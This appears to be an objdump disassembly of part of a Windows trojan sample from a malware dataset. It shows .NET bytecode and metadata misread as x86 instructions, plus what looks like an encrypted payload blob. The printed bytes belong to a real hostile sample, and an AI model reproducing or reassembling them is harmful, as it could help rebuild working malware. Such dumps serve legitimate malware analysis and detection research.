
malware_samples/trojan/558a05092178d95f22e676c00402e9e2005637878ae1719ec0bac7e503aec67e.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	60                   	pusha
  402001:	2c 00                	sub    $0x0,%al
  402003:	00 00                	add    %al,(%eax)
  402005:	00 00                	add    %al,(%eax)
  402007:	00 48 00             	add    %cl,0x0(%eax)
  40200a:	00 00                	add    %al,(%eax)
  40200c:	02 00                	add    (%eax),%al
  40200e:	05 00 d0 23 00       	add    $0x23d000,%eax
  402013:	00 5c 08 00          	add    %bl,0x0(%eax,%ecx,1)
  402017:	00 03                	add    %al,(%ebx)
  402019:	00 00                	add    %al,(%eax)
  40201b:	00 02                	add    %al,(%edx)
  40201d:	00 00                	add    %al,(%eax)
  40201f:	06                   	push   %es
  402020:	a8 22                	test   $0x22,%al
  402022:	00 00                	add    %al,(%eax)
  402024:	27                   	daa
  402025:	01 00                	add    %eax,(%eax)
	...
  40204f:	00 1e                	add    %bl,(%esi)
  402051:	02 28                	add    (%eax),%ch
  402053:	03 00                	add    (%eax),%eax
  402055:	00 0a                	add    %cl,(%edx)
  402057:	2a 0b                	sub    (%ebx),%cl
  402059:	30 04 00             	xor    %al,(%eax,%eax,1)
  40205c:	1e                   	push   %ds
  40205d:	00 00                	add    %al,(%eax)
  40205f:	00 00                	add    %al,(%eax)
  402061:	00 00                	add    %al,(%eax)
  402063:	00 28                	add    %ch,(%eax)
  402065:	03 00                	add    (%eax),%eax
  402067:	00 06                	add    %al,(%esi)
  402069:	de 16                	ficoms (%esi)
  40206b:	26 72 01             	es jb  0x40206f
  40206e:	00 00                	add    %al,(%eax)
  402070:	70 7e                	jo     0x4020f0
  402072:	01 00                	add    %eax,(%eax)
  402074:	00 04 16             	add    %al,(%esi,%edx,1)
  402077:	1f                   	pop    %ds
  402078:	10 28                	adc    %ch,(%eax)
  40207a:	04 00                	add    $0x0,%al
  40207c:	00 0a                	add    %cl,(%edx)
  40207e:	26 de 00             	fiadds %es:(%eax)
  402081:	2a 00                	sub    (%eax),%al
  402083:	00 01                	add    %al,(%ecx)
  402085:	10 00                	adc    %al,(%eax)
  402087:	00 00                	add    %al,(%eax)
  402089:	00 00                	add    %al,(%eax)
  40208b:	00 07                	add    %al,(%edi)
  40208d:	07                   	pop    %es
  40208e:	00 16                	add    %dl,(%esi)
  402090:	08 00                	or     %al,(%eax)
  402092:	00 01                	add    %al,(%ecx)
  402094:	1b 30                	sbb    (%eax),%esi
  402096:	04 00                	add    $0x0,%al
  402098:	f2 00 00             	repnz add %al,(%eax)
  40209b:	00 01                	add    %al,(%ecx)
  40209d:	00 00                	add    %al,(%eax)
  40209f:	11 28                	adc    %ebp,(%eax)
  4020a1:	05 00 00 0a 1b       	add    $0x1b0a0000,%eax
  4020a6:	8d 0a                	lea    (%edx),%ecx
  4020a8:	00 00                	add    %al,(%eax)
  4020aa:	01 13                	add    %edx,(%ebx)
  4020ac:	04 11                	add    $0x11,%al
  4020ae:	04 16                	add    $0x16,%al
  4020b0:	72 27                	jb     0x4020d9
  4020b2:	00 00                	add    %al,(%eax)
  4020b4:	70 a2                	jo     0x402058
  4020b6:	11 04 17             	adc    %eax,(%edi,%edx,1)
  4020b9:	7e 01                	jle    0x4020bc
  4020bb:	00 00                	add    %al,(%eax)
  4020bd:	04 a2                	add    $0xa2,%al
  4020bf:	11 04 18             	adc    %eax,(%eax,%ebx,1)
  4020c2:	72 31                	jb     0x4020f5
  4020c4:	00 00                	add    %al,(%eax)
  4020c6:	70 a2                	jo     0x40206a
  4020c8:	11 04 19             	adc    %eax,(%ecx,%ebx,1)
  4020cb:	7e 02                	jle    0x4020cf
  4020cd:	00 00                	add    %al,(%eax)
  4020cf:	04 a2                	add    $0xa2,%al
  4020d1:	11 04 1a             	adc    %eax,(%edx,%ebx,1)
  4020d4:	72 35                	jb     0x40210b
  4020d6:	00 00                	add    %al,(%eax)
  4020d8:	70 a2                	jo     0x40207c
  4020da:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  4020dd:	06                   	push   %es
  4020de:	00 00                	add    %al,(%eax)
  4020e0:	0a 28                	or     (%eax),%ch
  4020e2:	07                   	pop    %es
  4020e3:	00 00                	add    %al,(%eax)
  4020e5:	0a 0a                	or     (%edx),%cl
  4020e7:	06                   	push   %es
  4020e8:	28 08                	sub    %cl,(%eax)
  4020ea:	00 00                	add    %al,(%eax)
  4020ec:	0a 2c 11             	or     (%ecx,%edx,1),%ch
  4020ef:	06                   	push   %es
  4020f0:	20 80 00 00 00 28    	and    %al,0x28000000(%eax)
  4020f6:	09 00                	or     %eax,(%eax)
  4020f8:	00 0a                	add    %cl,(%edx)
  4020fa:	06                   	push   %es
  4020fb:	28 0a                	sub    %cl,(%edx)
  4020fd:	00 00                	add    %al,(%eax)
  4020ff:	0a 06                	or     (%esi),%al
  402101:	72 3f                	jb     0x402142
  402103:	00 00                	add    %al,(%eax)
  402105:	70 28                	jo     0x40212f
  402107:	04 00                	add    $0x0,%al
  402109:	00 06                	add    %al,(%esi)
  40210b:	28 05 00 00 06 28    	sub    %al,0x28060000
  402111:	0b 00                	or     (%eax),%eax
  402113:	00 0a                	add    %cl,(%edx)
  402115:	06                   	push   %es
  402116:	20 03                	and    %al,(%ebx)
  402118:	01 00                	add    %eax,(%eax)
  40211a:	00 28                	add    %ch,(%eax)
  40211c:	09 00                	or     %eax,(%eax)
  40211e:	00 0a                	add    %cl,(%edx)
  402120:	06                   	push   %es
  402121:	73 0c                	jae    0x40212f
  402123:	00 00                	add    %al,(%eax)
  402125:	0a 0d 09 28 0d 00    	or     0xd2809,%cl
  40212b:	00 0a                	add    %cl,(%edx)
  40212d:	6f                   	outsl  %ds:(%esi),(%dx)
  40212e:	0e                   	push   %cs
  40212f:	00 00                	add    %al,(%eax)
  402131:	0a 09                	or     (%ecx),%cl
  402133:	16                   	push   %ss
  402134:	6f                   	outsl  %ds:(%esi),(%dx)
  402135:	0f 00 00             	sldt   (%eax)
  402138:	0a 09                	or     (%ecx),%cl
  40213a:	28 10                	sub    %dl,(%eax)
  40213c:	00 00                	add    %al,(%eax)
  40213e:	0a 6f 11             	or     0x11(%edi),%ch
  402141:	00 00                	add    %al,(%eax)
  402143:	0a 09                	or     (%ecx),%cl
  402145:	17                   	pop    %ss
  402146:	6f                   	outsl  %ds:(%esi),(%dx)
  402147:	12 00                	adc    (%eax),%al
  402149:	00 0a                	add    %cl,(%edx)
  40214b:	09 17                	or     %edx,(%edi)
  40214d:	6f                   	outsl  %ds:(%esi),(%dx)
  40214e:	13 00                	adc    (%eax),%eax
  402150:	00 0a                	add    %cl,(%edx)
  402152:	09 0b                	or     %ecx,(%ebx)
  402154:	07                   	pop    %es
  402155:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402158:	00 0a                	add    %cl,(%edx)
  40215a:	0c 08                	or     $0x8,%al
  40215c:	6f                   	outsl  %ds:(%esi),(%dx)
  40215d:	15 00 00 0a 08       	adc    $0x80a0000,%eax
  402162:	6f                   	outsl  %ds:(%esi),(%dx)
  402163:	16                   	push   %ss
  402164:	00 00                	add    %al,(%eax)
  402166:	0a 2c 0b             	or     (%ebx,%ecx,1),%ch
  402169:	08 6f 16             	or     %ch,0x16(%edi)
  40216c:	00 00                	add    %al,(%eax)
  40216e:	0a 28                	or     (%eax),%ch
  402170:	17                   	pop    %ss
  402171:	00 00                	add    %al,(%eax)
  402173:	0a de                	or     %dh,%bl
  402175:	0a 08                	or     (%eax),%cl
  402177:	2c 06                	sub    $0x6,%al
  402179:	08 6f 18             	or     %ch,0x18(%edi)
  40217c:	00 00                	add    %al,(%eax)
  40217e:	0a dc                	or     %ah,%bl
  402180:	06                   	push   %es
  402181:	20 80 00 00 00 28    	and    %al,0x28000000(%eax)
  402187:	09 00                	or     %eax,(%eax)
  402189:	00 0a                	add    %cl,(%edx)
  40218b:	06                   	push   %es
  40218c:	28 0a                	sub    %cl,(%edx)
  40218e:	00 00                	add    %al,(%eax)
  402190:	0a 2a                	or     (%edx),%ch
  402192:	00 00                	add    %al,(%eax)
  402194:	01 10                	add    %edx,(%eax)
  402196:	00 00                	add    %al,(%eax)
  402198:	02 00                	add    (%eax),%al
  40219a:	bb 00 1b d6 00       	mov    $0xd61b00,%ebx
  40219f:	0a 00                	or     (%eax),%al
  4021a1:	00 00                	add    %al,(%eax)
  4021a3:	00 1b                	add    %bl,(%ebx)
  4021a5:	30 02                	xor    %al,(%edx)
  4021a7:	00 38                	add    %bh,(%eax)
  4021a9:	00 00                	add    %al,(%eax)
  4021ab:	00 02                	add    %al,(%edx)
  4021ad:	00 00                	add    %al,(%eax)
  4021af:	11 28                	adc    %ebp,(%eax)
  4021b1:	19 00                	sbb    %eax,(%eax)
  4021b3:	00 0a                	add    %cl,(%edx)
  4021b5:	02 6f 1a             	add    0x1a(%edi),%ch
  4021b8:	00 00                	add    %al,(%eax)
  4021ba:	0a 0a                	or     (%edx),%cl
  4021bc:	73 1b                	jae    0x4021d9
  4021be:	00 00                	add    %al,(%eax)
  4021c0:	0a 0b                	or     (%ebx),%cl
  4021c2:	06                   	push   %es
  4021c3:	07                   	pop    %es
  4021c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4021c5:	1c 00                	sbb    $0x0,%al
  4021c7:	00 0a                	add    %cl,(%edx)
  4021c9:	07                   	pop    %es
  4021ca:	6f                   	outsl  %ds:(%esi),(%dx)
  4021cb:	1d 00 00 0a 0c       	sbb    $0xc0a0000,%eax
  4021d0:	de 14 07             	ficoms (%edi,%eax,1)
  4021d3:	2c 06                	sub    $0x6,%al
  4021d5:	07                   	pop    %es
  4021d6:	6f                   	outsl  %ds:(%esi),(%dx)
  4021d7:	18 00                	sbb    %al,(%eax)
  4021d9:	00 0a                	add    %cl,(%edx)
  4021db:	dc 06                	faddl  (%esi)
  4021dd:	2c 06                	sub    $0x6,%al
  4021df:	06                   	push   %es
  4021e0:	6f                   	outsl  %ds:(%esi),(%dx)
  4021e1:	18 00                	sbb    %al,(%eax)
  4021e3:	00 0a                	add    %cl,(%edx)
  4021e5:	dc 08                	fmull  (%eax)
  4021e7:	2a 01                	sub    (%ecx),%al
  4021e9:	1c 00                	sbb    $0x0,%al
  4021eb:	00 02                	add    %al,(%edx)
  4021ed:	00 12                	add    %dl,(%edx)
  4021ef:	00 10                	add    %dl,(%eax)
  4021f1:	22 00                	and    (%eax),%al
  4021f3:	0a 00                	or     (%eax),%al
  4021f5:	00 00                	add    %al,(%eax)
  4021f7:	00 02                	add    %al,(%edx)
  4021f9:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4021fc:	20 2c 00             	and    %ch,(%eax,%eax,1)
  4021ff:	0a 00                	or     (%eax),%al
  402201:	00 00                	add    %al,(%eax)
  402203:	00 1b                	add    %bl,(%ebx)
  402205:	30 02                	xor    %al,(%edx)
  402207:	00 45 00             	add    %al,0x0(%ebp)
  40220a:	00 00                	add    %al,(%eax)
  40220c:	03 00                	add    (%eax),%eax
  40220e:	00 11                	add    %dl,(%ecx)
  402210:	02 73 1e             	add    0x1e(%ebx),%dh
  402213:	00 00                	add    %al,(%eax)
  402215:	0a 0a                	or     (%edx),%cl
  402217:	06                   	push   %es
  402218:	16                   	push   %ss
  402219:	73 1f                	jae    0x40223a
  40221b:	00 00                	add    %al,(%eax)
  40221d:	0a 0b                	or     (%ebx),%cl
  40221f:	73 1b                	jae    0x40223c
  402221:	00 00                	add    %al,(%eax)
  402223:	0a 0c 07             	or     (%edi,%eax,1),%cl
  402226:	08 6f 1c             	or     %ch,0x1c(%edi)
  402229:	00 00                	add    %al,(%eax)
  40222b:	0a 08                	or     (%eax),%cl
  40222d:	6f                   	outsl  %ds:(%esi),(%dx)
  40222e:	1d 00 00 0a 0d       	sbb    $0xd0a0000,%eax
  402233:	de 1e                	ficomps (%esi)
  402235:	08 2c 06             	or     %ch,(%esi,%eax,1)
  402238:	08 6f 18             	or     %ch,0x18(%edi)
  40223b:	00 00                	add    %al,(%eax)
  40223d:	0a dc                	or     %ah,%bl
  40223f:	07                   	pop    %es
  402240:	2c 06                	sub    $0x6,%al
  402242:	07                   	pop    %es
  402243:	6f                   	outsl  %ds:(%esi),(%dx)
  402244:	18 00                	sbb    %al,(%eax)
  402246:	00 0a                	add    %cl,(%edx)
  402248:	dc 06                	faddl  (%esi)
  40224a:	2c 06                	sub    $0x6,%al
  40224c:	06                   	push   %es
  40224d:	6f                   	outsl  %ds:(%esi),(%dx)
  40224e:	18 00                	sbb    %al,(%eax)
  402250:	00 0a                	add    %cl,(%edx)
  402252:	dc 09                	fmull  (%ecx)
  402254:	2a 00                	sub    (%eax),%al
  402256:	00 00                	add    %al,(%eax)
  402258:	01 28                	add    %ebp,(%eax)
  40225a:	00 00                	add    %al,(%eax)
  40225c:	02 00                	add    (%eax),%al
  40225e:	15 00 10 25 00       	adc    $0x251000,%eax
  402263:	0a 00                	or     (%eax),%al
  402265:	00 00                	add    %al,(%eax)
  402267:	00 02                	add    %al,(%edx)
  402269:	00 0f                	add    %cl,(%edi)
  40226b:	00 20                	add    %ah,(%eax)
  40226d:	2f                   	das
  40226e:	00 0a                	add    %cl,(%edx)
  402270:	00 00                	add    %al,(%eax)
  402272:	00 00                	add    %al,(%eax)
  402274:	02 00                	add    (%eax),%al
  402276:	07                   	pop    %es
  402277:	00 32                	add    %dh,(%edx)
  402279:	39 00                	cmp    %eax,(%eax)
  40227b:	0a 00                	or     (%eax),%al
  40227d:	00 00                	add    %al,(%eax)
  40227f:	00 7e 28             	add    %bh,0x28(%esi)
  402282:	19 00                	sbb    %eax,(%eax)
  402284:	00 0a                	add    %cl,(%edx)
  402286:	6f                   	outsl  %ds:(%esi),(%dx)
  402287:	20 00                	and    %al,(%eax)
  402289:	00 0a                	add    %cl,(%edx)
  40228b:	6f                   	outsl  %ds:(%esi),(%dx)
  40228c:	21 00                	and    %eax,(%eax)
  40228e:	00 0a                	add    %cl,(%edx)
  402290:	80 01 00             	addb   $0x0,(%ecx)
  402293:	00 04 72             	add    %al,(%edx,%esi,2)
  402296:	67 00 00             	add    %al,(%bx,%si)
  402299:	70 80                	jo     0x40221b
  40229b:	02 00                	add    (%eax),%al
  40229d:	00 04 2a             	add    %al,(%edx,%ebp,1)
  4022a0:	1e                   	push   %ds
  4022a1:	02 28                	add    (%eax),%ch
  4022a3:	03 00                	add    (%eax),%eax
  4022a5:	00 0a                	add    %cl,(%edx)
  4022a7:	2a 23                	sub    (%ebx),%ah
  4022a9:	01 00                	add    %eax,(%eax)
  4022ab:	00 5d 90             	add    %bl,-0x70(%ebp)
  4022ae:	c1 6a c2 40          	shrl   $0x40,-0x3e(%edx)
  4022b2:	10 86 ef 01 df 61    	adc    %al,0x61df01ef(%esi)
  4022b8:	58                   	pop    %eax
  4022b9:	88 d1                	mov    %dl,%cl
  4022bb:	43                   	inc    %ebx
  4022bc:	8c da                	mov    %ds,%edx
  4022be:	43                   	inc    %ebx
  4022bf:	c1 a2 58 8b a5 97 6a 	shll   $0x6a,-0x685a74a8(%edx)
  4022c6:	68 6d 7b 11 ca       	push   $0xca117b6d
  4022cb:	9a 8c ee c2 66 37 ec 	lcall  $0xec37,$0x66c2ee8c
  4022d2:	4e                   	dec    %esi
  4022d3:	1a 83 a4 cf de 0d    	sbb    0xddecfa4(%ebx),%al
  4022d9:	f4                   	hlt
  4022da:	d0 7a 1b             	sarb   $1,0x1b(%edx)
  4022dd:	86 e1                	xchg   %ah,%cl
  4022df:	9f                   	lahf
  4022e0:	ef                   	out    %eax,(%dx)
  4022e1:	ff 96 f2 08 da 10    	call   *0x10da08f2(%esi)
  4022e7:	b0 f0                	mov    $0xf0,%al
  4022e9:	3b 2f                	cmp    (%edi),%ebp
  4022eb:	c7                   	(bad)
  4022ec:	0c e6                	or     $0xe6,%al
  4022ee:	73 3f                	jae    0x40232f
  4022f0:	ee                   	out    %al,(%dx)
  4022f1:	d6                   	salc
  4022f2:	cf                   	iret
  4022f3:	69 b8 67 70 32 64 e0 	imul   $0x9fe530e0,0x64327067(%eax),%edi
  4022fa:	30 e5 9f 
  4022fd:	eb b3                	jmp    0x4022b2
  4022ff:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  402300:	d4 9a                	aam    $0x9a
  402302:	0c 9d                	or     $0x9d,%al
  402304:	0b 96 4e c8 23 41    	or     0x4123c84e(%esi),%edx
  40230a:	32 0e                	xor    (%esi),%cl
  40230c:	82 d2 d4             	adc    $0xd4,%dl
  40230f:	68 9d 40 a5 20       	push   $0x20a5409d
  402314:	7e 30                	jle    0x402346
  402316:	45                   	inc    %ebp
  402317:	c1 75 0e 4c          	shll   $0x4c,0xe(%ebp)
  40231b:	d6                   	salc
  40231c:	16                   	push   %ss
  40231d:	22 41 54             	and    0x54(%ecx),%al
  402320:	ba 59 92 08 2e       	mov    $0x2e089259,%edx
  402325:	27                   	daa
  402326:	b7 d3                	mov    $0xd3,%bh
  402328:	9b                   	fwait
  402329:	51                   	push   %ecx
  40232a:	d9 90 30 9a eb a6    	fsts   -0x591465d0(%eax)
  402330:	16                   	push   %ss
  402331:	68 71 94 99 22       	push   $0x22999471
  402336:	39 70 72             	cmp    %esi,0x72(%eax)
  402339:	c4 2d 55 65 04 f1    	les    0xf1046555,%ebp
  40233f:	9b                   	fwait
  402340:	c3                   	ret
  402341:	15 77 32 4b b9       	adc    $0xb94b3277,%eax
  402346:	75 52                	jne    0x40239a
  402348:	9f                   	lahf
  402349:	20 de                	and    %bl,%dh
  40234b:	56                   	push   %esi
  40234c:	f4                   	hlt
  40234d:	28 15 42 14 12 16    	sub    %dl,0x16121442
  402353:	65 b8 af 47 fe 3e    	gs mov $0x3efe47af,%eax
  402359:	62 bd 40 23 81 f3    	bound  %edi,-0xc7edcc0(%ebp)
  40235f:	1c d2                	sbb    $0xd2,%al
  402361:	68 58 e8 4a c1       	push   $0xc14ae858
  402366:	74 d1                	je     0x402339
  402368:	9f                   	lahf
  402369:	f4                   	hlt
  40236a:	02 5f 63             	add    0x63(%edi),%bl
  40236d:	b3 dd                	mov    $0xdd,%bl
  40236f:	41                   	inc    %ecx
  402370:	88 d6                	mov    %dl,%dh
  402372:	1a ab f0 0b 55 d8    	sbb    -0x27aaf410(%ebx),%ch
  402378:	75 19                	jne    0x402393
  40237a:	c3                   	ret
  40237b:	00 fe                	add    %bh,%dh
  40237d:	52                   	push   %edx
  40237e:	7e 48                	jle    0x4023c8
  402380:	0d 4f 32 cf 51       	or     $0x51cf324f,%eax
  402385:	43                   	inc    %ebx
  402386:	bc 31 29 c4 eb       	mov    $0xebc42931,%esp
  40238b:	33 66 15             	xor    0x15(%esi),%esp
  40238e:	f9                   	stc
  40238f:	b0 d4                	mov    $0xd4,%al
  402391:	28 99 35 b0 6a 4a    	sub    %bl,0x4a6ab035(%ecx)
  402397:	ee                   	out    %al,(%dx)
  402398:	1c b0                	sbb    $0xb0,%al
  40239a:	5a                   	pop    %edx
  40239b:	f8                   	clc
  40239c:	ef                   	out    %eax,(%dx)
  40239d:	83 c9 f0             	or     $0xfffffff0,%ecx
  4023a0:	42                   	inc    %edx
  4023a1:	b6 b9                	mov    $0xb9,%dh
  4023a3:	bc 76 9c f1 af       	mov    $0xaff19c76,%esp
  4023a8:	00 88 df d1 1e e0    	add    %cl,-0x1fe12e21(%eax)
  4023ae:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4023af:	d2 f7                	shl    %cl,%bh
  4023b1:	ee                   	out    %al,(%dx)
  4023b2:	7f 60                	jg     0x402414
  4023b4:	07                   	pop    %es
  4023b5:	9c                   	pushf
  4023b6:	72 12                	jb     0x4023ca
  4023b8:	57                   	push   %edi
  4023b9:	d0 77 e8             	shlb   $1,-0x18(%edi)
  4023bc:	ed                   	in     (%dx),%eax
  4023bd:	b5 19                	mov    $0x19,%ch
  4023bf:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4023c0:	4c                   	dec    %esp
  4023c1:	5c                   	pop    %esp
  4023c2:	da 96 41 1f ba 05    	ficoml 0x5ba1f41(%esi)
  4023c8:	0c 83                	or     $0x83,%al
  4023ca:	60                   	pusha
  4023cb:	76 e5                	jbe    0x4023b2
  4023cd:	f6 07 00             	testb  $0x0,(%edi)
  4023d0:	42                   	inc    %edx
  4023d1:	53                   	push   %ebx
  4023d2:	4a                   	dec    %edx
  4023d3:	42                   	inc    %edx
  4023d4:	01 00                	add    %eax,(%eax)
  4023d6:	01 00                	add    %eax,(%eax)
  4023d8:	00 00                	add    %al,(%eax)
  4023da:	00 00                	add    %al,(%eax)
  4023dc:	0c 00                	or     $0x0,%al
  4023de:	00 00                	add    %al,(%eax)
  4023e0:	76 34                	jbe    0x402416
  4023e2:	2e 30 2e             	xor    %ch,%cs:(%esi)
  4023e5:	33 30                	xor    (%eax),%esi
  4023e7:	33 31                	xor    (%ecx),%esi
  4023e9:	39 00                	cmp    %eax,(%eax)
  4023eb:	00 00                	add    %al,(%eax)
  4023ed:	00 05 00 6c 00 00    	add    %al,0x6c00
  4023f3:	00 b8 02 00 00 23    	add    %bh,0x23000002(%eax)
  4023f9:	7e 00                	jle    0x4023fb
  4023fb:	00 24 03             	add    %ah,(%ebx,%eax,1)
  4023fe:	00 00                	add    %al,(%eax)
  402400:	bc 03 00 00 23       	mov    $0x23000003,%esp
  402405:	53                   	push   %ebx
  402406:	74 72                	je     0x40247a
  402408:	69 6e 67 73 00 00 00 	imul   $0x73,0x67(%esi),%ebp
  40240f:	00 e0                	add    %ah,%al
  402411:	06                   	push   %es
  402412:	00 00                	add    %al,(%eax)
  402414:	7c 00                	jl     0x402416
  402416:	00 00                	add    %al,(%eax)
  402418:	23 55 53             	and    0x53(%ebp),%edx
  40241b:	00 5c 07 00          	add    %bl,0x0(%edi,%eax,1)
  40241f:	00 10                	add    %dl,(%eax)
  402421:	00 00                	add    %al,(%eax)
  402423:	00 23                	add    %ah,(%ebx)
  402425:	47                   	inc    %edi
  402426:	55                   	push   %ebp
  402427:	49                   	dec    %ecx
  402428:	44                   	inc    %esp
  402429:	00 00                	add    %al,(%eax)
  40242b:	00 6c 07 00          	add    %ch,0x0(%edi,%eax,1)
  40242f:	00 f0                	add    %dh,%al
  402431:	00 00                	add    %al,(%eax)
  402433:	00 23                	add    %ah,(%ebx)
  402435:	42                   	inc    %edx
  402436:	6c                   	insb   (%dx),%es:(%edi)
  402437:	6f                   	outsl  %ds:(%esi),(%dx)
  402438:	62 00                	bound  %eax,(%eax)
  40243a:	00 00                	add    %al,(%eax)
  40243c:	00 00                	add    %al,(%eax)
  40243e:	00 00                	add    %al,(%eax)
  402440:	02 00                	add    (%eax),%al
  402442:	00 01                	add    %al,(%ecx)
  402444:	57                   	push   %edi
  402445:	15 02 00 09 01       	adc    $0x1090002,%eax
  40244a:	00 00                	add    %al,(%eax)
  40244c:	00 fa                	add    %bh,%dl
  40244e:	25 33 00 16 00       	and    $0x160033,%eax
  402453:	00 01                	add    %al,(%ecx)
  402455:	00 00                	add    %al,(%eax)
  402457:	00 16                	add    %dl,(%esi)
  402459:	00 00                	add    %al,(%eax)
  40245b:	00 03                	add    %al,(%ebx)
  40245d:	00 00                	add    %al,(%eax)
  40245f:	00 02                	add    %al,(%edx)
  402461:	00 00                	add    %al,(%eax)
  402463:	00 07                	add    %al,(%edi)
  402465:	00 00                	add    %al,(%eax)
  402467:	00 03                	add    %al,(%ebx)
  402469:	00 00                	add    %al,(%eax)
  40246b:	00 21                	add    %ah,(%ecx)
  40246d:	00 00                	add    %al,(%eax)
  40246f:	00 02                	add    %al,(%edx)
  402471:	00 00                	add    %al,(%eax)
  402473:	00 03                	add    %al,(%ebx)
  402475:	00 00                	add    %al,(%eax)
  402477:	00 01                	add    %al,(%ecx)
  402479:	00 00                	add    %al,(%eax)
  40247b:	00 03                	add    %al,(%ebx)
  40247d:	00 00                	add    %al,(%eax)
  40247f:	00 01                	add    %al,(%ecx)
  402481:	00 00                	add    %al,(%eax)
  402483:	00 00                	add    %al,(%eax)
  402485:	00 0a                	add    %cl,(%edx)
  402487:	00 01                	add    %al,(%ecx)
  402489:	00 00                	add    %al,(%eax)
  40248b:	00 00                	add    %al,(%eax)
  40248d:	00 06                	add    %al,(%esi)
  40248f:	00 4a 00             	add    %cl,0x0(%edx)
  402492:	43                   	inc    %ebx
  402493:	00 06                	add    %al,(%esi)
  402495:	00 c8                	add    %cl,%al
  402497:	00 a8 00 06 00 e8    	add    %ch,-0x17fffa00(%eax)
  40249d:	00 a8 00 0a 00 27    	add    %ch,0x27000a00(%eax)
  4024a3:	01 12                	add    %edx,(%edx)
  4024a5:	01 0a                	add    %ecx,(%edx)
  4024a7:	00 32                	add    %dh,(%edx)
  4024a9:	01 12                	add    %edx,(%edx)
  4024ab:	01 0a                	add    %ecx,(%edx)
  4024ad:	00 3f                	add    %bh,(%edi)
  4024af:	01 12                	add    %edx,(%edx)
  4024b1:	01 0a                	add    %ecx,(%edx)
  4024b3:	00 51 01             	add    %dl,0x1(%ecx)
  4024b6:	12 01                	adc    (%ecx),%al
  4024b8:	06                   	push   %es
  4024b9:	00 65 01             	add    %ah,0x1(%ebp)
  4024bc:	43                   	inc    %ebx
  4024bd:	00 06                	add    %al,(%esi)
  4024bf:	00 79 01             	add    %bh,0x1(%ecx)
  4024c2:	6f                   	outsl  %ds:(%esi),(%dx)
  4024c3:	01 06                	add    %eax,(%esi)
  4024c5:	00 8a 01 43 00 06    	add    %cl,0x6004301(%edx)
  4024cb:	00 a0 01 6f 01 06    	add    %ah,0x6016f01(%eax)
  4024d1:	00 ac 01 6f 01 0e 00 	add    %ch,0xe016f(%ecx,%eax,1)
  4024d8:	f1                   	int1
  4024d9:	01 de                	add    %ebx,%esi
  4024db:	01 06                	add    %eax,(%esi)
  4024dd:	00 02                	add    %al,(%edx)
  4024df:	02 43 00             	add    0x0(%ebx),%al
  4024e2:	0e                   	push   %cs
  4024e3:	00 97 02 de 01 06    	add    %dl,0x601de02(%edi)
  4024e9:	00 cb                	add    %cl,%bl
  4024eb:	02 43 00             	add    0x0(%ebx),%al
  4024ee:	06                   	push   %es
  4024ef:	00 f1                	add    %dh,%cl
  4024f1:	02 df                	add    %bh,%bl
  4024f3:	02 06                	add    (%esi),%al
  4024f5:	00 0f                	add    %cl,(%edi)
  4024f7:	03 6f 01             	add    0x1(%edi),%ebp
  4024fa:	06                   	push   %es
  4024fb:	00 30                	add    %dh,(%eax)
  4024fd:	03 6f 01             	add    0x1(%edi),%ebp
  402500:	0e                   	push   %cs
  402501:	00 62 03             	add    %ah,0x3(%edx)
  402504:	4c                   	dec    %esp
  402505:	03 0e                	add    (%esi),%ecx
  402507:	00 70 03             	add    %dh,0x3(%eax)
  40250a:	4c                   	dec    %esp
  40250b:	03 06                	add    (%esi),%eax
  40250d:	00 87 03 df 02 00    	add    %al,0x2df03(%edi)
  402513:	00 00                	add    %al,(%eax)
  402515:	00 01                	add    %al,(%ecx)
  402517:	00 00                	add    %al,(%eax)
  402519:	00 00                	add    %al,(%eax)
  40251b:	00 01                	add    %al,(%ecx)
  40251d:	00 01                	add    %al,(%ecx)
  40251f:	00 00                	add    %al,(%eax)
  402521:	00 10                	add    %dl,(%eax)
  402523:	00 1a                	add    %bl,(%edx)
  402525:	00 00                	add    %al,(%eax)
  402527:	00 05 00 01 00 01    	add    %al,0x1000100
  40252d:	00 01                	add    %al,(%ecx)
  40252f:	00 10                	add    %dl,(%eax)
  402531:	00 32                	add    %dh,(%edx)
  402533:	00 00                	add    %al,(%eax)
  402535:	00 05 00 01 00 02    	add    %al,0x2000100
  40253b:	00 11                	add    %dl,(%ecx)
  40253d:	00 57 00             	add    %dl,0x0(%edi)
  402540:	0e                   	push   %cs
  402541:	00 11                	add    %dl,(%ecx)
  402543:	00 5f 00             	add    %bl,0x0(%edi)
  402546:	0e                   	push   %cs
  402547:	00 50 20             	add    %dl,0x20(%eax)
  40254a:	00 00                	add    %al,(%eax)
  40254c:	00 00                	add    %al,(%eax)
  40254e:	86 18                	xchg   %bl,(%eax)
  402550:	51                   	push   %ecx
  402551:	00 0a                	add    %cl,(%edx)
  402553:	00 01                	add    %al,(%ecx)
  402555:	00 58 20             	add    %bl,0x20(%eax)
  402558:	00 00                	add    %al,(%eax)
  40255a:	00 00                	add    %al,(%eax)
  40255c:	96                   	xchg   %eax,%esi
  40255d:	00 65 00             	add    %ah,0x0(%ebp)
  402560:	11 00                	adc    %eax,(%eax)
  402562:	01 00                	add    %eax,(%eax)
  402564:	94                   	xchg   %eax,%esp
  402565:	20 00                	and    %al,(%eax)
  402567:	00 00                	add    %al,(%eax)
  402569:	00 91 00 6a 00 17    	add    %dl,0x17006a00(%ecx)
  40256f:	00 02                	add    %al,(%edx)
  402571:	00 a4 21 00 00 00 00 	add    %ah,0x0(%ecx,%eiz,1)
  402578:	91                   	xchg   %eax,%ecx
  402579:	00 79 00             	add    %bh,0x0(%ecx)
  40257c:	1b 00                	sbb    (%eax),%eax
  40257e:	02 00                	add    (%eax),%al
  402580:	04 22                	add    $0x22,%al
  402582:	00 00                	add    %al,(%eax)
  402584:	00 00                	add    %al,(%eax)
  402586:	91                   	xchg   %eax,%ecx
  402587:	00 86 00 21 00 03    	add    %al,0x3002100(%esi)
  40258d:	00 a0 22 00 00 00    	add    %ah,0x22(%eax)
  402593:	00 86 18 51 00 0a    	add    %al,0xa005118(%esi)
  402599:	00 04 00             	add    %al,(%eax,%eax,1)
  40259c:	80 22 00             	andb   $0x0,(%edx)
  40259f:	00 00                	add    %al,(%eax)
  4025a1:	00 91 18 80 03 17    	add    %dl,0x17038018(%ecx)
  4025a7:	00 04 00             	add    %al,(%eax,%eax,1)
  4025aa:	00 00                	add    %al,(%eax)
